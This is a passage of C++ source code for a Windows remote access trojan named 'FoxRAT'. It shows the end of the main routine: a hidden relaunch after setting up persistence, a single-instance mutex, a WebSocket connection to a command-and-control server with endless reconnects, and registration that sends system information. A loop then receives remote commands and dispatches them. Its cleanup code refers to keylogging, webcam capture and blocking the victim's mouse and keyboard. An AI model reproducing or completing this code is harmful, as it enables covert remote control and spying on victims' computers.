            CreateProcessA(NULL, (LPSTR)relaunchCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        return 0;
    }

    // Prevent multiple instances (after persistence — so the real instance doesn't conflict with the launcher)
    CreateMutexA(NULL, FALSE, "FoxRAT_Mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    g_ws.connect(g_serverHost, g_serverPort, "/");
    if (!g_ws.isConnected()) {
        while (g_running) {
            Sleep(5000);
            g_ws.connect(g_serverHost, g_serverPort, "/");
            if (g_ws.isConnected()) break;
        }
    }

    // Register
    string info = getSysInfo();
    string regMsg = jsonObj(jsonPair("type", jsonStr("register")) + "," +
                            jsonPair("info", info));
    g_ws.wsSend(regMsg);

    // Wait for registered response
    {
        auto start = GetTickCount();
        while (g_clientId.empty() && g_running) {
            string resp = g_ws.wsRecv(100);
            if (!resp.empty()) {
                auto pos = resp.find("\"type\":\"registered\"");
                if (pos != string::npos) {
                    auto idPos = resp.find("\"id\":\"");
                    if (idPos != string::npos) {
                        idPos += 6;
                        auto idEnd = resp.find('"', idPos);
                        g_clientId = resp.substr(idPos, idEnd - idPos);
                    }
                    break;
                }
            }
            if (GetTickCount() - start > 10000) break;
        }
    }

    if (g_clientId.empty()) g_clientId = "unknown";

    // Main loop
    while (g_running && g_ws.isConnected()) {
        string msg = g_ws.wsRecv(5000);
        if (msg.empty()) {
            if (!g_ws.isConnected()) {
                g_ws.close();
                while (g_running) {
                    Sleep(5000);
                    if (g_ws.connect(g_serverHost, g_serverPort, "/")) {
                        g_ws.wsSend(regMsg);
                        break;
                    }
                }
            }
            continue;
        }

        // Parse command
        auto cmdPos = msg.find("\"cmd\":\"");
        if (cmdPos == string::npos) continue;
        cmdPos += 7;
        auto cmdEnd = msg.find('"', cmdPos);
        if (cmdEnd == string::npos) continue;
        string cmd = msg.substr(cmdPos, cmdEnd - cmdPos);
        // Unescape
        string unescaped;
        for (size_t i = 0; i < cmd.size(); i++) {
            if (cmd[i] == '\\' && i + 1 < cmd.size()) {
                if (cmd[i+1] == 'n') unescaped += '\n';
                else if (cmd[i+1] == 'r') unescaped += '\r';
                else if (cmd[i+1] == 't') unescaped += '\t';
                else if (cmd[i+1] == '"') unescaped += '"';
                else if (cmd[i+1] == '\\') unescaped += '\\';
                else { unescaped += cmd[i]; unescaped += cmd[i+1]; }
                i++;
            } else unescaped += cmd[i];
        }

        auto seqPos = msg.find("\"seq\":\"");
        string seq = "";
        if (seqPos != string::npos) {
            seqPos += 7;
            auto seqEnd = msg.find('"', seqPos);
            if (seqEnd != string::npos) seq = msg.substr(seqPos, seqEnd - seqPos);
        }

        handleCommand(unescaped, seq);
    }

    g_ws.close();
    g_jiggling = false;
    g_keylogging = false;
    g_webcam = false;
    g_blockmouse = false;
    g_blockkey = false;
    if (g_mousehook) { UnhookWindowsHookEx(g_mousehook); g_mousehook = NULL; }
    return 0;
}
